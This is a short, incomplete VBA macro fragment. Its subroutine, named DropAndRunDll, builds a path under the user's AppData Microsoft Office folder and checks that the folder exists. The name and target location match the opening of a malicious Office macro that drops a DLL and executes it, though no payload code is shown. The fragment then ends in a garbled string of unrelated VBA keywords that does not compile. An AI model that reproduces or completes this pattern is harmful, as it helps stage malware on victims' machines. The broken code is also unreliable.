
Private Sub DropAndRunDll()
Dim dll_Loc As String
Dim i As Integer
i = 1
dll_Loc = Environ("AppData") & "\\Microsoft\\Office"
If Dir(dll_Loc, vbDirectory) = _
   vbNullString Then
    Exit Sub
End If
MidB MidB$ chunk Mid$ Mid abcd Is Like 12